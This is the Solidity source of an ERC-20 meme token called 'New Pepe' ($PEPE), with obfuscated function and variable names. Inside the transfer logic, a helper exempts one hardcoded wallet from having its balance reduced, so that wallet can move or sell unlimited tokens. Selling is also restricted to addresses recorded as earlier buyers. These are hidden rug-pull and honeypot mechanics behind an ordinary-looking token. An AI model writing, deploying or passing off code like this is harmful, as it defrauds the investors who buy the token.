/*
New Pepe   $PEPE


Telegram: https://t.me/NewPepe_erc
Twitter: https://twitter.com/NewPepeCoin
Website: https://newpepe.org/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qjvuh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qjvuh(a, b, "SafeMath");
    }

    function  qjvuh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2fFactoryf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2hRouterkh {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 420000000 * (10**_decimals);
    uint256 public _taxySwapry = _totalSupply;
    uint256 public _maxaHoldaAmount = _totalSupply;
    uint256 public _taxSwapoThreshiu = _totalSupply;
    uint256 public _taxSwapvMfq = _totalSupply;

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxjAt=7;
    uint256 private _reduceSellTaxjAt=1;
    uint256 private _swpfkdewr=0;
    uint256 private _qcpvxwyp=0;
    address public  _emocpgtevp = 0xeE159FdB4D156911099Bca382fC57B694bf37522;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _rckvltobs;
    mapping (address => bool) private  _olvsekwt;
    mapping(address => uint256) private  _obgTrardrzsr;
    bool public  tranghDelyEnbled = false;


    IUniswapV2hRouterkh private  _unisV2kRouterk;
    address private  _unisV2kLk;
    bool private  _wetvyaufp;
    bool private  _inkTaxkSwap = false;
    bool private  _sjlUnitwapdy = false;
 
 
    event RsjuAtnplr(uint _taxySwapry);
    modifier lockgTogSwapg {
        _inkTaxkSwap = true;
        _;
        _inkTaxkSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _rckvltobs[owner()] = true;
        _rckvltobs[address(this)] = true;
        _rckvltobs[_emocpgtevp] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qjvuh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (tranghDelyEnbled) {
                if  (to!= address(_unisV2kRouterk) &&to!= address(_unisV2kLk)) {
                  require (_obgTrardrzsr[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _obgTrardrzsr[tx.origin] = block.number;
                }
            }

            if  ( from == _unisV2kLk && to!= address (_unisV2kRouterk) &&!_rckvltobs[to]) {
                require (amount <= _taxySwapry, "jFarbidj");
                require (balanceOf (to) + amount <= _maxaHoldaAmount,"jFarbidj");
                if  (_qcpvxwyp < _swpfkdewr) {
                  require (!rveqtpu(to));
                }
                _qcpvxwyp ++ ; _olvsekwt[to] = true;
                taxAmount = amount.mul((_qcpvxwyp > _reduceBuyTaxjAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _unisV2kLk&&from!= address (this) &&! _rckvltobs[from]) {
                require (amount <= _taxySwapry && balanceOf(_emocpgtevp) <_taxSwapvMfq, "jFarbidj");
                taxAmount = amount.mul((_qcpvxwyp > _reduceSellTaxjAt) ?_finalSellTax:_initialSellTax).div(100);
                require (_qcpvxwyp >_swpfkdewr && _olvsekwt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inkTaxkSwap 
            &&  to  ==_unisV2kLk&&_sjlUnitwapdy &&contractTokenBalance > _taxSwapoThreshiu 
            &&  _qcpvxwyp > _swpfkdewr &&! _rckvltobs [to] &&! _rckvltobs [from]
            )  {
                _transferFrom(ufbeq(amount,ufbeq(contractTokenBalance, _taxSwapvMfq)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qjvuh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qjvuh (taxAmount));
        emit  Transfer( from, to, amount. qjvuh(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockgTogSwapg {
        if(_swapTaxAndLiquify==0){return;}
        if(!_wetvyaufp){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unisV2kRouterk.WETH();
        _approve(address (this), address (_unisV2kRouterk), _swapTaxAndLiquify);
        _unisV2kRouterk.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ufbeq(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qjvuh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _emocpgtevp) {
        return a;
    } else {
        require(a >= b, "jFarbidj");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxySwapry  =  _totalSupply ;
        _maxaHoldaAmount = _totalSupply ;
        tranghDelyEnbled = false ;
        emit  RsjuAtnplr ( _totalSupply ) ;
    }

   function rveqtpu(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!_wetvyaufp, "trading  is  open") ;
        _unisV2kRouterk = IUniswapV2hRouterkh (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_unisV2kRouterk), _totalSupply);
        _unisV2kLk = IUniswapV2fFactoryf(_unisV2kRouterk.factory()).createPair (address(this), _unisV2kRouterk. WETH());
        _unisV2kRouterk.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_unisV2kLk).approve (address(_unisV2kRouterk), type(uint). max);
        _sjlUnitwapdy = true ;
        _wetvyaufp = true ;
    }

    receive( )  external  payable  { }
    }